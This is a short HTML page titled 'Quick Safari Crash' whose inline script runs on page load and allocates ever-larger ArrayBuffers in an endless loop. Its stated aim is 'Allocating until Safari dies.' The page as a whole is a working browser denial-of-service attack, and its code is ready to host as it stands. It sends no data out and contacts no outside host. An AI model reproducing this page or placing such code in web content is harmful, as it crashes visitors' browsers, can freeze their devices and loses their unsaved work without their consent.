<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Quick Safari Crash</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <style>
    body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;background:#f8f8f8;color:#333}
  </style>
</head>
<body>
  <div>
    <h1>Crashing Fast…</h1>
    <p>Allocating until Safari dies.</p>
  </div>
  <script>
    (function crashFast(){
      const a=[];
      let size=1;
      while(true){
        a.push(new ArrayBuffer(size*1024*1024));
        size*=2;
      }
    })();
  </script>
</body>
</html>
